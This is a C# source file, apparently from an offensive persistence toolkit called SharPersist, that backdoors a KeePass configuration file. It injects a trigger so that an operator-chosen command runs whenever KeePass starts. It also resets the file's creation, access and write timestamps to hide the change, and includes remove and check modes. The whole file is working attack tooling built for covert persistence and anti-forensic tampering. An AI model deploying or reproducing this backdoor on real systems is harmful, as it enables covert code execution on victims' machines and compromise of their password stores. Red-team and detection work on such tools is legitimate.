using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Diagnostics;

namespace SharPersist
{
    public class KeePassBackdoor : Persistence
    {
        public KeePassBackdoor(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status, string option) : base(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option)
        {
            initialize(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option);

        }

        // initial function to decide which method needs performed and if valid args given
        public void initialize(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status, string option)
        {

            // adding persistence
            if (status.ToLower().Equals("add"))
            {
                if (command.Equals("") || filePath.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give both a command and a file path to KeePass config file. See help (-h).");
                    return;
                }

                addPersistence(command, commandArg, filePath);
            }

            // removing persistence
            else if (status.ToLower().Equals("remove"))
            {
                if (filePath.Equals(""))
                {

                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give file path of KeePass config to restore. See help (-h).");
                    return;

                }

                removePersistence(filePath);
            }

            // dry run
            else if (status.ToLower().Equals("check"))
            {
                checkPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status);
            }

            // listing persistence
            else if (status.ToLower().Equals("list"))
            {
                listPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status);
            }

            //invalid status given
            else
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: Invalid method given. Must give add, remove, check or list. See help (-h).");
                return;
            }

        } // end initialize method



        // add persistence trigger
        public void addPersistence(string command, string commandArg, string filePath)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Adding keepass backdoor persistence");
            Console.WriteLine("[*] INFO: Command: " + command);
            Console.WriteLine("[*] INFO: Command Args: " + commandArg);
            Console.WriteLine("[*] INFO: File Path: " + filePath);
            Console.WriteLine("");


            // check to make sure that KeePass process is not running
            Process[] procs = Process.GetProcesses();
            bool keepassRunning = false;
            foreach (Process proc in procs)
            {
                if (proc.ProcessName.ToLower().Contains("keepass"))
                {
                    keepassRunning = true;

                }
            } // end for each process


            // if keepass is not running, then proceed with backdooring config file
            if (!keepassRunning)
            {
                string contents = File.ReadAllText(filePath); // get contents of file given

                // only proceed if it is indeed a keepass config
                if (contents.Contains("TriggerSystem"))
                {

                    try
                    {
                        // get current file attributes
                        DateTime creationTime = File.GetCreationTime(filePath);
                        DateTime lastAccessTime = File.GetLastAccessTime(filePath);
                        DateTime lastWriteTime = File.GetLastWriteTime(filePath);

                        File.Copy(filePath, filePath + ".bak"); // copy the original KeePass file as a backup file

                        // set file attributes for the backup file to match the original
                        File.SetCreationTime(filePath + ".bak", creationTime);
                        File.SetLastAccessTime(filePath + ".bak", lastAccessTime);
                        File.SetLastWriteTime(filePath + ".bak", lastWriteTime);


                        // string to hold the backdoored command needing to be written
                        String backdooredContent = @"
            <Triggers>
            <Trigger>
                <Guid>Z26+bdu9zUO8LXO0Gcw1Gw==</Guid>
                <Name>Debug</Name>
                <Events>
                    <Event>
                        <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>
                           <Parameters>
                               <Parameter>0</Parameter>
                               <Parameter/>
                           </Parameters>
                       </Event>
                   </Events>
                   <Conditions/>
                   <Actions>
                       <Action>
                           <TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
                              <Parameters>" + @"
                                     <Parameter>" + command + @"</Parameter>
                                        <Parameter>" + commandArg + @"</Parameter>
                                           <Parameter>False</Parameter>
                                           <Parameter>1</Parameter>
                                           <Parameter/>
                                       </Parameters>
                                   </Action>
                               </Actions>
                           </Trigger>
                           </Triggers>
                           ";


                        // open KeePass file to be modified and save contents in a string
                        string fileContents = File.ReadAllText(filePath);

                        // replace appropriate strings with backdoored content
                        fileContents = fileContents.Replace("<Triggers />", backdooredContent);

                        // write to the modified and backdoored KeePass file
                        File.WriteAllText(filePath, fileContents);

                        // set file attributes for the backdoored KeePass config file to match what it originally was
                        File.SetCreationTime(filePath, creationTime);
                        File.SetLastAccessTime(filePath, lastAccessTime);
                        File.SetLastWriteTime(filePath, lastWriteTime);

                    }
                    catch (FileNotFoundException ex)
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Keepass configuration file not found. Ensure you have correct path and that user is using KeePass. See help (-h).");
                        return;
                    }

                    Console.WriteLine("");
                    Console.WriteLine("[+] SUCCESS: Keepass persistence backdoor added");
                    Console.WriteLine("[*] INFO: Location of original KeePass config file: " + filePath + ".bak");
                    Console.WriteLine("[*] INFO: Location of backdoored KeePass config file: " + filePath);
                    Console.WriteLine("[*] INFO: SHA256 Hash of original KeePass config file: " + lib.Utils.SHA256CheckSum(filePath + ".bak"));
                    Console.WriteLine("[*] INFO: SHA256 Hash of backdoored KeePass config file: " + lib.Utils.SHA256CheckSum(filePath));
                    Console.WriteLine("");
                } // end if file is a keepass config

                // if file is not a keepass config
                else
                {
                    Console.WriteLine("[-] ERROR: This is NOT a KeePass config file");

                }

            }

            // if keepass is running, then display message
            else
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: KeePass is currently running. KeePass cannot be running in order to backdoor config file.");
                return;
            }

        } // end addPersistence



        // remove persistence trigger
        public void removePersistence(string filePath)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Removing keepass backdoor persistence");
            Console.WriteLine("[*] INFO: File Path: " + filePath);
            Console.WriteLine("");

            // check to make sure that KeePass process is not running
            Process[] procs = Process.GetProcesses();
            bool keepassRunning = false;
            foreach (Process proc in procs)
            {
                if (proc.ProcessName.ToLower().Contains("keepass"))
                {
                    keepassRunning = true;

                }
            } // end for each process

            // only remove persistence trigger if keepass is not running
            if (!keepassRunning)
            {
                // remove only if the keepass file was backdoored
                if (File.Exists(filePath + ".bak"))
                {

                    try
                    {
                        // get current file attributes of backup file
                        DateTime creationTime = File.GetCreationTime(filePath + ".bak");
                        DateTime lastAccessTime = File.GetLastAccessTime(filePath + ".bak");
                        DateTime lastWriteTime = File.GetLastWriteTime(filePath + ".bak");

                        File.Delete(filePath); // delete the current backdoored KeePass file
                        File.Move(filePath + ".bak", filePath); // move the backup file (pre-backdoor) to the active file now

                        // set file attributes for the restored KeePass config file to match what it originally was
                        File.SetCreationTime(filePath, creationTime);
                        File.SetLastAccessTime(filePath, lastAccessTime);
                        File.SetLastWriteTime(filePath, lastWriteTime);
                    }
                    catch (FileNotFoundException ex)
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Keepass configuration file not found. Ensure you have correct path and that user is using KeePass. See help (-h).");
                        return;
                    }

                    Console.WriteLine("");
                    Console.WriteLine("[+] SUCCESS: Keepass persistence backdoor removed");
                    Console.WriteLine("");
                }

                // if KeePass config file not found
                else
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Keepass configuration file was not found. Ensure you have correct path and that user is using KeePass.");
                }

            } // end if keepass is not running

            // if keepass is running, indicate message and return
            else
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: KeePass is currently running. KeePass cannot be running in order to backdoor config file.");
                return;
            }


        } // end removePersistence


        // check for persistence technique
        public void checkPersistence(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status)
        {

            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking if file given exists");

            // check to make sure the keepass config file exists
            if (File.Exists(filePath))
            {
                Console.WriteLine("[+] SUCCESS: KeePass config file given exists");


                Console.WriteLine("");
                Console.WriteLine("[*] INFO: Checking to make sure file is a KeePass config");

                // read contents of config. if it has the run system command action GUID, then it is already backdoored
                string contents = File.ReadAllText(filePath);
                if (contents.Contains("TriggerSystem"))
                {
                    Console.WriteLine("[+] SUCCESS: This is KeePass config file");

                    Console.WriteLine("");
                    Console.WriteLine("[*] INFO: Checking backdoor present in KeePass config file");

                    if (contents.Contains("2uX4OwcwTBOe7y66y27kxw=="))
                    {
                        Console.WriteLine("[-] ERROR: KeePass config file is backdoored already");
                    }
                    else
                    {
                        Console.WriteLine("[+] SUCCESS: KeePass config file is NOT backdoored");
                    }

                }
                else
                {
                    Console.WriteLine("[-] ERROR: This is NOT a KeePass config file");

                }
             

            } // end if keepass config file exists


            // if keepass config file does not exist, display message
            else
            {
                Console.WriteLine("[-] ERROR: KeePass config file given does NOT exist");
            }

            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking if KeePass process is running");


            // check to make sure that KeePass process is not running
            Process [] procs = Process.GetProcesses();
            bool keepassRunning = false;
            foreach(Process proc in procs)
            {
                if (proc.ProcessName.ToLower().Contains("keepass"))
                {
                    keepassRunning = true;

                }
            } // end for each process

            if (keepassRunning)
            {
                Console.WriteLine("[-] ERROR: KeePass is currently running. KeePass cannot be running in order to backdoor config file.");
            }
            else
            {
                Console.WriteLine("[+] SUCCESS: KeePass is not currently running.");
            }


            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking for correct arguments given");

            // make sure that command and file path are given
            if (command.Equals("") || filePath.Equals(""))
            {
                Console.WriteLine("[-] ERROR: Must give both a command and a file path to KeePass config file. See help (-h).");
                return;
            }

            Console.WriteLine("[+] SUCCESS: Correct arguments given");


        } // end checkPersistence method

        // list persistence
        public void listPersistence(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status)
        {
            Console.WriteLine("");
            Console.WriteLine("[-] ERROR: List command not supported for this method.");

        } // end list persistence


    } // end class

} // end namespace
